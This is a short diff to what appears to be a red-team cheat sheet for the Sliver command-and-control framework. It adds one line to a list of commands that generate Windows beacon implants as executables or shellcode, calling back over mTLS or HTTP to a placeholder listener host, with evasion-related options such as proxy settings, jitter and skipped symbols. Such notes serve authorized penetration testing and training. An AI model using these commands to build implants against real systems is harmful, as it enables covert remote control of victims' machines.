@@ -425,6 +425,7 @@ sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe -
 sliver > generate beacon --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
 sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name lock-http --save /tmp/
 sliver > generate beacon --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name lock-http --save /tmp/ -G
+sliver > generate beacon --http <LHOST>?proxy=http://<LHOST>:8080,<LHOST>?driver=wininet --os windows --arch amd64 --format shellcode --seconds 30 --jitter 3 --name <NAME> --save /tmp/<FILE>.bin -G --skip-symbols
 ```
 
 ### Profile Handling
